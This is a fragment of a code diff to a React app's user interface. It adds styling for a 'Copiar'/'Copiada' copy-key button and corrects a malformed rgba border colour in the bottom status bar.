+                          border: '1px solid var(--neon-green)',
+                          color: 'var(--neon-green)',
+                          padding: '5px 10px',
+                          fontSize: '0.7rem',
+                          cursor: 'pointer',
+                          display: 'flex',
+                          alignItems: 'center',
+                          gap: '4px',
+                          fontFamily: 'var(--font-mono)',
+                          borderRadius: '2px',
+                          flexShrink: 0
+                        }}
+                      >
+                        {keyCopied ? <Check size={12} /> : <Copy size={12} />}
+                        {keyCopied ? 'Copiada' : 'Copiar'}
+                      </button>
+                    </div>
+                  )}
                 </div>
               ) : (
                 <div style={{ textAlign: 'center', padding: '40px', color: 'var(--text-muted)', border: '1px dashed rgba(0, 218, 255, 0.1)', background: 'rgba(5, 8, 17, 0.4)' }}>
@@ -1171,7 +1382,7 @@ export default function App() {
       {/* Bottom stats status bar */}
       <footer style={{
         background: '#050811',
-        borderTop: '1px solid rgba(0,255,10 green,0.1)',
+        borderTop: '1px solid rgba(0, 255, 102, 0.15)',
         padding: '5px 20px',
         display: 'flex',
         justifyContent: 'space-between',
